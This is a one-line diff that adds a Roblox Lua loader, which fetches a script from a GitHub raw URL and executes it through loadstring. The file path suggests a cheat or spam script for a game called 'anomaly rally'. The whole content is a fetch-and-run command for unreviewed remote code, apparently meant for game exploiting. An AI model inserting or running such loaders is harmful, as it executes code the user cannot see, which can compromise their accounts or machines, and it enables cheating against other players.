@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/anomaly-rally-wrong-way-spam0-cr56mydzoa4e23.lua"))()
